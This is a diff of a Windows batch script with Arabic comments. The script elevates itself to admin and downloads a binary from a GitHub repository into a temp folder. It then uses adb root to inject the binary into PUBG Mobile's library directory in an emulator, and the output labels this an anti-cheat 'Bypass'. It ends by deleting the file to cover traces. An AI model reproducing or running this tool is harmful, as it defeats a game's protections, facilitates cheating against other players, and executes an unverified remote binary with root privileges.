@@ -1,103 +1,64 @@
 @echo off
 chcp 65001 >nul
 
-:: Check if running as administrator
+:: التأكد من الصلاحيات
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    echo Requesting administrative privileges...
     powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
-:: Read path from redit.txt and verify it exists
-if not exist C:\Windows\System32\config\systemprofile\redit.txt (
+:: تغيير مسار الـ redit للمسار الأضمن اللي اتفقنا عليه في الـ ++C
+set "redit_file=C:\Windows\Temp\menta\redit.txt"
+
+if not exist "%redit_file%" (
     echo ERROR: redit.txt not found!
     pause
     exit /b
 )
 
-:: Read path and remove any extra spaces or empty lines
-for /f "tokens=*" %%A in ('type C:\Windows\System32\config\systemprofile\redit.txt') do set target_path=%%A
+for /f "tokens=*" %%A in ('type "%redit_file%"') do set "target_path=%%A"
+set "target_path=%target_path:\\=\%"
+set "target_path=%target_path:AndroidEmulatorEn.exe=adb.exe%"
 
-:: Ensure the path is not empty
-if "%target_path%"=="" (
-    echo ERROR: No valid path found in redit.txt!
-    pause
-    exit /b
-)
+for %%I in ("%target_path%") do set "target_dir=%%~dpI"
+cd /d "%target_dir%" || (echo FAIL & pause & exit /b)
 
-:: Replace double backslashes with single ones
-set target_path=%target_path:\\=\%
-
-:: Replace AndroidEmulatorEn.exe with adb.exe
-set target_path=%target_path:AndroidEmulatorEn.exe=adb.exe%
-
-:: Extract the directory path (remove the filename)
-for %%I in ("%target_path%") do set target_dir=%%~dpI
-
-:: Ensure the directory exists before changing to it
-if not exist "%target_dir%" (
-    echo ERROR: The directory does not exist!
-    echo Path: "%target_dir%"
-    pause
-    exit /b
-)
-
-:: Change directory to the extracted path
-cd /d "%target_dir%" || (
-    echo ERROR: Failed to change directory.
-    echo Path: "%target_dir%"
-    pause
-    exit /b
-)
-
-:: Check for admin privileges
-fltmc >nul 2>&1
-if not %errorlevel%==0 (
-    echo WARNING: Please run this script as administrator.
-    pause
-    exit
-)
-
-:: Define the hidden path for storing the file
-set hiddenPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\SystemTools
+:: مسار تحميل الملف (الـ Temp أضمن من الـ AppData في حالة الـ System Profile)
+set "hiddenPath=C:\Windows\Temp\menta"
 if not exist "%hiddenPath%" mkdir "%hiddenPath%"
 
-:: Define the filename
-set fileName=libAkAudioVisiual.so
+set "fileName=libAkAudioVisiual.so"
 
-:: Download the file using PowerShell
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/jack74512/UAO7/raw/refs/heads/main/%fileName%' -OutFile '%hiddenPath%\%fileName%'"
+echo Downloading Bypass File...
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/jack74512/UAO7/raw/refs/heads/main/%fileName%' -OutFile '%hiddenPath%\%fileName%'"
 
-:: Verify the download was successful
 if not exist "%hiddenPath%\%fileName%" (
-    echo ERROR: File download failed!
+    echo ERROR: Download Failed!
+    pause
     exit /b
 )
 
-:: Start ADB commands
 adb kill-server
 adb start-server
-
-:: --- START PUBG MOBILE (From the Same Directory) ---
-echo Launching PUBG Mobile...
-adb shell monkey -p com.tencent.ig -c android.intent.category.LAUNCHER 1
-timeout /t 5 >nul
+echo Launching PUBG...
+adb shell monkey -p com.tencent.ig -c android.intent.category.LAUNCHer 1
+timeout /t 8 >nul
 
 adb root
 adb remount
+echo Injecting Bypass...
 adb push "%hiddenPath%\%fileName%" /data/local/tmp/
 adb shell mv /data/local/tmp/%fileName% /data/data/com.tencent.ig/lib/
-:: Wait for 45 seconds before proceeding
-echo Waiting for 45 seconds...
+:: إعطاء صلاحيات كاملة للملف عشان اللعبة تقرأه
+adb shell chmod 777 /data/data/com.tencent.ig/lib/%fileName%
+
+echo Waiting for 45 seconds (Game Loading)...
 timeout /t 45 >nul
 
-adb shell rm /data/data/com.tencent.ig/lib/libAkAudioVisiual.so
-
-
-:: Clean up the hidden path
+echo Cleaning up...
+adb shell rm /data/data/com.tencent.ig/lib/%fileName%
 if exist "%hiddenPath%\%fileName%" del "%hiddenPath%\%fileName%"
 
-echo.
-echo SUCCESS: All commands executed successfully!
+echo SUCCESS! Bypass Finished.
 pause
